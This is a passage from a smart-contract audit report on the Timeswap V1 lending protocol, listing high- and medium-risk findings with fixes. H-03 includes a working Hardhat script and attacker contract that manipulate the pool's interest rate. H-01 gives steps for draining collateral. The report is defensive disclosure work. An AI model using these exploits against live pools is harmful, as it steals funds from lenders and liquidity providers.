still increased by the value of the user's input at L332.\n\nEven though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.\n\nPlus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338>\n\n```solidity\nfunction borrow(\n    uint256 maturity,\n    address assetTo,\n    address dueTo,\n    uint112 xDecrease,\n    uint112 yIncrease,\n    uint112 zIncrease,\n    bytes calldata data\n) external override lock returns (uint256 id, Due memory dueOut) {\n    require(block.timestamp < maturity, 'E202');\n    require(assetTo != address(0) && dueTo != address(0), 'E201');\n    require(assetTo != address(this) && dueTo != address(this), 'E204');\n    require(xDecrease > 0, 'E205');\n\n    Pool storage pool = pools[maturity];\n    require(pool.state.totalLiquidity > 0, 'E206');\n\n    BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);\n\n    dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);\n    dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);\n    dueOut.startBlock = BlockNumber.get();\n\n    Callback.borrow(collateral, dueOut.collateral, data);\n\n    id = pool.dues[dueTo].insert(dueOut);\n\n    pool.state.reserves.asset -= xDecrease;\n    pool.state.reserves.collateral += dueOut.collateral;\n    pool.state.totalDebtCreated += dueOut.debt;\n\n    pool.state.x -= xDecrease;\n    pool.state.y += yIncrease;\n    pool.state.z += zIncrease;\n\n    asset.safeTransfer(assetTo, xDecrease);\n\n    emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);\n    emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut);\n}\n```\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79>\n\n```solidity\nfunction getCollateral(\n    uint256 maturity,\n    IPair.State memory state,\n    uint112 xDecrease,\n    uint112 zIncrease\n) internal view returns (uint112 collateralIn) {\n    uint256 _collateralIn = maturity;\n    _collateralIn -= block.timestamp;\n    _collateralIn *= zIncrease;\n    _collateralIn = _collateralIn.shiftRightUp(25);\n    uint256 minimum = state.z;\n    minimum *= xDecrease;\n    uint256 denominator = state.x;\n    denominator -= xDecrease;\n    minimum = minimum.divUp(denominator);\n    _collateralIn += minimum;\n    collateralIn = _collateralIn.toUint112();\n}\n```\n\n#### Proof of Concept\n\nNear the maturity time, the attacker can do the following:\n\n1.  `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests);\n2.  `pay()` the loan and get back the collateral;\n3.  `lend()` a regular amount of `state.x`, get a large amount of insurance token;\n4.  `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.\n\n#### Recommendation\n\nConsider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/162)**\n\n## [[H-02] `TimeswapConvenience.sol#borrowGivenDebt()` Attacker can increase `state.y` to an extremely large value with a dust amount of `assetOut`](https://github.com/code-423n4/2022-01-timeswap-findings/issues/169)\n_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53>\n\nThis issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.\n\nActually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.\n\n#### Impact\n\n*   When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:\n\nLendMath.check(): <https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28>\n\nBorrowMath.check(): <https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31>\n\n*   An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/169)**\n\n## [[H-03] Manipulation of the Y State Results in Interest Rate Manipulation](https://github.com/code-423n4/2022-01-timeswap-findings/issues/187)\n_Submitted by Rhynorater, also found by harleythedog, hyh, and WatchPug_\n\nDue to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.\n\nDisclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.\n\n#### Proof of Concept\n\nThe attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.\n\nConsider the following HardHat script:\n\n```js\nconst hre = require(\"hardhat\");\n\n\n//jtok is asset\n//usdc is collat\n\nasync function launchTestTokens(tokenDeployer){\n    //Launch a token\n    const TestToken = await ethers.getContractFactory(\"TestToken\", signer=tokenDeployer);\n    const tt = await TestToken.deploy(\"JTOK\", \"JTOK\", 1000000000000000)\n    const tt2 = await TestToken.deploy(\"USDC\", \"USDC\", 1000000000000000)\n    let res = await tt.balanceOf(tokenDeployer.address)\n    let res2 = await tt.balanceOf(tokenDeployer.address)\n    console.log(\"JTOK balance: \"+res)\n    console.log(\"USDC balance: \"+res2)\n    return [tt, tt2]\n}\n\nasync function deployAttackersContract(attacker, jtok, usdc){\n    const Att = await ethers.getContractFactory(\"Attacker\", signer=attacker)\n    const atakcontrak = await Att.deploy(jtok.address, usdc.address)\n    return atakcontrak\n}\n\nasync function deployLPContract(lp, jtok, usdc){\n    const LP = await ethers.getContractFactory(\"LP\", signer=lp)\n    const lpc = await LP.deploy(jtok.address, usdc.address)\n    return lpc\n}\n\nasync function main() {\n    const [tokenDeployer, lp, attacker] = await ethers.getSigners();\n    let balance = await tokenDeployer.getBalance()\n    let factory = await ethers.getContractAt(\"TimeswapFactory\", \"0x5FbDB2315678afecb367f032d93F642f64180aa3\", signer=tokenDeployer)\n    //let [jtok, usdc] = await launchTestTokens(tokenDeployer)\n    let jtok = await ethers.getContractAt(\"TestToken\", \"0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6\", signer=tokenDeployer)\n    let usdc = await ethers.getContractAt(\"TestToken\", \"0x8a791620dd6260079bf849dc5567adc3f2fdc318\", signer=tokenDeployer)\n    console.log(\"Jtok: \"+jtok.address)\n    console.log(\"USDC: \"+usdc.address)\n\n    //Create Pair\n    //let txn = await factory.createPair(jtok.address, usdc.address)\n    pairAddress = await factory.getPair(jtok.address, usdc.address)\n    pair = await ethers.getContractAt(\"TimeswapPair\", pairAddress, signer=tokenDeployer)\n    console.log(\"Pair address: \"+pairAddress);\n\n    // Deploy LP\n    //let lpc = await deployLPContract(lp, jtok, usdc)\n    let lpc = await ethers.getContractAt(\"LP\", \"0x948b3c65b89df0b4894abe91e6d02fe579834f8f\", signer=lp)\n\n\n    let jtokb = await jtok.balanceOf(lpc.address)\n    let usdcb = await usdc.balanceOf(lpc.address)\n    console.log(\"LP Jtok: \"+jtokb)\n    console.log(\"LP USDC: \"+usdcb)\n\n    //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)\n    let res = await pair.constantProduct(1641859791);\n    console.log(\"Post LP Constants:\", res);\n\n    let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)\n\n    jtokb = await jtok.balanceOf(atakcontrak.address)\n    usdcb = await usdc.balanceOf(atakcontrak.address)\n    console.log(\"Attacker Jtok: \"+jtokb)\n    console.log(\"Attacker USDC: \"+usdcb)\n\n    //mint some tokens\n    let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)\n\n    let res2 = await pair.constantProduct(1641859791);\n    console.log(\"Post Attack Constants:\", res2);\n\n}\nmain().then(()=>process.exit(0))\n\n```\n\nFirst, the LP deploys their pool and contributes their desired amount of tokens with the below contract:\n\n```solidity\npragma solidity =0.8.4;\n\nimport \"hardhat/console.sol\";\nimport {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\";\nimport {IPair} from \"./interfaces/IPair.sol\";\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\ninterface TestTokenLP is IERC20{\n    function mmint(uint256 amount) external;\n}\n\ncontract LP is ITimeswapMintCallback {\n\n    uint112 constant SEC_PER_YEAR = 31556926;\n    TestTokenLP internal jtok;\n    TestTokenLP internal usdc;\n\nconstructor(address _jtok, address _usdc){\n    jtok = TestTokenLP(_jtok);\n    jtok.mmint(10_000 ether);\n    usdc = TestTokenLP(_usdc);\n    usdc.mmint(10_000 ether);\n}\n\nfunction timeswapMint(uint maturity, uint112 APR, address pairAddress) public{\n    uint256 maturity = maturity;\n    console.log(\"Maturity: \", maturity);\n    address liquidityTo = address(this);\n    address dueTo = address(this);\n    uint112 xIncrease = 5_000 ether;\n    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);\n    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP\n    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\");\n}\n\n\nfunction timeswapMintCallback(\n        uint112 assetIn,\n        uint112 collateralIn,\n        bytes calldata data\n    ) override external{\n        jtok.mmint(100_000 ether);\n        usdc.mmint(100_000 ether);\n        console.log(\"Asset requested:\", assetIn);\n        console.log(\"Collateral requested:\", collateralIn);\n        //check before\n        uint256 beforeJtok = jtok.balanceOf(msg.sender);\n        console.log(\"LP jtok before\", beforeJtok);\n        //transfer\n        jtok.transfer(msg.sender, assetIn);\n        //check after\n        uint256 afterJtok = jtok.balanceOf(msg.sender);\n        console.log(\"LP jtok after\", afterJtok);\n        //check before\n        uint256 beforeUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"LP USDC  before\", beforeUsdc);\n        //transfer\n        usdc.transfer(msg.sender, collateralIn);\n        //check after\n        uint256 afterUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"LP USDC After\", afterUsdc);\n        \n    }\n}\n\n```\n\nHere are the initialization values:\n```solidity\nuint112 xIncrease = 5_000 ether;\nuint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);\nuint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP\n```\n\nWith this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: <https://timeswap.gitbook.io/timeswap/deep-dive/borrowing>\nto  be:\n\n```\nyMax: 4.7533146923118e-06\nMin Interest Rate: 0.009374999999999765\nMax Interest Rate: 0.14999999999999625\nzMax: 1666.6666666666667\n\n```\n\nAround 1% to 15%.\n\nThen, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract:\n```solidity\npragma solidity =0.8.4;\n\nimport \"hardhat/console.sol\";\nimport {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\";\nimport {IPair} from \"./interfaces/IPair.sol\";\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\ninterface TestTokenAtt is IERC20{\n    function mmint(uint256 amount) external;\n}\n\ncontract Attacker is ITimeswapMintCallback {\n\n    uint112 constant SEC_PER_YEAR = 31556926;\n    TestTokenAtt internal jtok;\n    TestTokenAtt internal usdc;\n\nconstructor(address _jtok, address _usdc){\n    jtok = TestTokenAtt(_jtok);\n    jtok.mmint(10_000 ether);\n    usdc = TestTokenAtt(_usdc);\n    usdc.mmint(10_000 ether);\n}\n\nfunction timeswapMint(uint maturity, uint112 APR, address pairAddress) public{\n    uint256 maturity = maturity;\n    console.log(\"Maturity: \", maturity);\n    address liquidityTo = address(this);\n    address dueTo = address(this);\n    uint112 xIncrease = 3;\n    uint112 yIncrease = 1000000000000000;\n    uint112 zIncrease = 5; //Static 167% CDP\n    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\");\n}\n\n\nfunction timeswapMintCallback(\n        uint112 assetIn,\n        uint112 collateralIn,\n        bytes calldata data\n    ) override external{\n        jtok.mmint(100_000 ether);\n        usdc.mmint(100_000 ether);\n        console.log(\"Asset requested:\", assetIn);\n        console.log(\"Collateral requested:\", collateralIn);\n        //check before\n        uint256 beforeJtok = jtok.balanceOf(msg.sender);\n        console.log(\"Attacker jtok before\", beforeJtok);\n        //transfer\n        jtok.transfer(msg.sender, assetIn);\n        //check after\n        uint256 afterJtok = jtok.balanceOf(msg.sender);\n        console.log(\"Attacker jtok after\", afterJtok);\n        //check before\n        uint256 beforeUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"Attacker USDC  before\", beforeUsdc);\n        //transfer\n        usdc.transfer(msg.sender, collateralIn);\n        //check after\n        uint256 afterUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"Attacker USDC After\", afterUsdc);\n        \n    }\n}\n```\n\nWhich contains the following settings for a mint:\n```solidity\nuint112 xIncrease = 3;\nuint112 yIncrease = 1000000000000000;\nuint112 zIncrease = 5; //Static 167% CDP\n```\n\nAccording to my logs in hardhat:\n\n```\nMaturity:  1641859791\nCallback before: 8333825816710789998373\nAsset requested: 3\nCollateral requested: 6\nAttacker jtok before 5000000000000000000000\nAttacker jtok after 5000000000000000000003\nAttacker USDC  before 8333825816710789998373\nAttacker USDC After 8333825816710789998379\nCallback after: 8333825816710789998379\nCallback expected after: 8333825816710789998379\n```\n\nThe attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes:\n```\nyMax: 0.0002047533146923118\nMin Interest Rate: 0.40383657499999975\nMax Interest Rate: 6.461385199999996\nzMax: 1666.6666666666667\n```\nBetween 40 and 646 percent.\n\nxyz values before and after:\n\n```\nPost LP Constants: [ BigNumber { value: \"5000000000000000000000\" },\n  BigNumber { value: \"23766573461559\" },\n  BigNumber { value: \"8333333333333333333333\" },\n  x: BigNumber { value: \"5000000000000000000000\" },\n  y: BigNumber { value: \"23766573461559\" },\n  z: BigNumber { value: \"8333333333333333333333\" } ]\nAttacker Jtok: 10000000000000000000000\nAttacker USDC: 10000000000000000000000\nPost Attack Constants: [ BigNumber { value: \"5000000000000000000003\" },\n  BigNumber { value: \"1023766573461559\" },\n  BigNumber { value: \"8333333333333333333338\" },\n  x: BigNumber { value: \"5000000000000000000003\" },\n  y: BigNumber { value: \"1023766573461559\" },\n  z: BigNumber { value: \"8333333333333333333338\" } ]\n\n```\n\nThis result in destruction of the pool.\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/187)**\n\n**[CloudEllie (C4) commented](https://github.com/code-423n4/2022-01-timeswap-findings/issues/187#issuecomment-1010049204):**\n > Warden rhynorater requested that we add to his submission.  See comment for details.\n\n\n\n## [[H-04] Important state updates are made after the callback in the mint() function ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/4)\n_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `mint()` function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n\n#### Recommended Mitigation Steps\n\nThe callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/4):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/107\n\n\n\n## [[H-05] In the lend() function state updates are made after the callback ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/5)\n_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `lend()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n\n#### Recommended Mitigation Steps\n\nThe callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/5):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/106\n\n\n\n## [[H-06] borrow() function has state updates after a callback to msg.sender ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/6)\n_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `borrow()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n#### Recommended Mitigation Steps\n\nThe callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/6):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/105\n\n\n\n## [[H-07] pay() function has callback to msg.sender before important state updates ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/7)\n_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `pay()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n\n#### Recommended Mitigation Steps\n\nThe callback \"if (assetIn > 0) Callback.pay(asset, assetIn, data);\"  should be placed at the end of the pay() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/7):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/104\n\n\n \n# Medium Risk Findings (10)\n## [[M-01] `burn()` doesn't call ERC721 `_burn()`](https://github.com/code-423n4/2022-01-timeswap-findings/issues/111)\n_Submitted by sirhashalot_\n\nThe CollateralizedDebt.sol contract is a ERC721 token. It has a `mint()` function, which uses the underlying `safeMint()` function to create an ERC721 token representing a collateral position. The `burn()` function in CollateralizedDebt.sol should reverse the actions of `mint()` by burning the ERC721 token, but the ERC721 `_burn()` function is never called. This means a user can continue to hold their ERC721 token representing their position after receiving their funds. This is unlike the `burn()` function found in Bond.sol, Insurance.sol, and Liquidity.sol, which all call the `_burn()` function (though note the `_burn()` function in these other Timeswap Convenience contracts is the ERC20 `_burn()`).\n\n#### Proof of Concept\n\nThe problematic `burn()` function is found in CollareralizedDebt.sol\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L80-L88>\n\nCompare this function to the `burn()` functions defined in the other Timeswap Convenience contracts, which contain calls to `_burn()`\n\n#### Recommended Mitigation Steps\n\nInclude the following line in the `burn()` function\n`_burn(id);`\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/111):**\n > If decided not to burn the ERC721 token at all. The burn in this context is burning the debt and collateral locked balance in the ERC721 token.\n\n\n\n## [[M-02] safeDecimals can revert causing DoS](https://github.com/code-423n4/2022-01-timeswap-findings/issues/112)\n_Submitted by sirhashalot_\n\nThe `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.\n\nA similar issue was found in a previoud code4rena contest: <https://github.com/code-423n4/2021-05-nftx-findings/issues/46>\n\n#### Proof of Concept\n\nThe root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol\n\nThe following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32`\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54>\n\n`safeDecimals()` is used in multiple functions such as\n\n*   CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54)\n*   Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34)\n*   Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)\n\n#### Recommended Mitigation Steps\n\nModify the `safeDecimals()` function to change >= 32 to == 32 like this\n`if (success && data.length == 32) return   abi.decode(data, (uint8));`\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/112):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/61\n\n\n\n## [[M-03] `safeName()` can revert causing DoS](https://github.com/code-423n4/2022-01-timeswap-findings/issues/113)\n_Submitted by sirhashalot_\n\nThe `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.\n\nThe root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:\n<https://kauri.io/#single/dai-token-guide-for-developers/#token-info>\n\nBecause this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47>\n\n#### Proof of Concept\n\nThe root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol\n\nThe `safeName()` function is called in:\n\n*   [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25)\n*   [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36)\n*   [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27)\n*   [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)\n\n#### Recommended Mitigation Steps\n\nUse the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47>\n\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/113):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/60\n\n\n\n## [[M-04] `safeSymbol()` can revert causing DoS](https://github.com/code-423n4/2022-01-timeswap-findings/issues/114)\n_Submitted by sirhashalot_\n\nThe `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.\n\nThe root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.\n\nBecause this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39>\n\n#### Proof of Concept\n\nThe root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol\n\nThe `safeSymbol()` function is called in:\n\n*   [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31)\n*   [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42)\n*   [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33)\n*   [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)\n\n#### Recommended Mitigation Steps\n\nUse the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39>\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/114):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/59\n\n\n\n## [[M-05] XSS via SVG Construction contract](https://github.com/code-423n4/2022-01-timeswap-findings/issues/131)\n_Submitted by thank_you, also found by 0x1f8b_\n\nSVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG 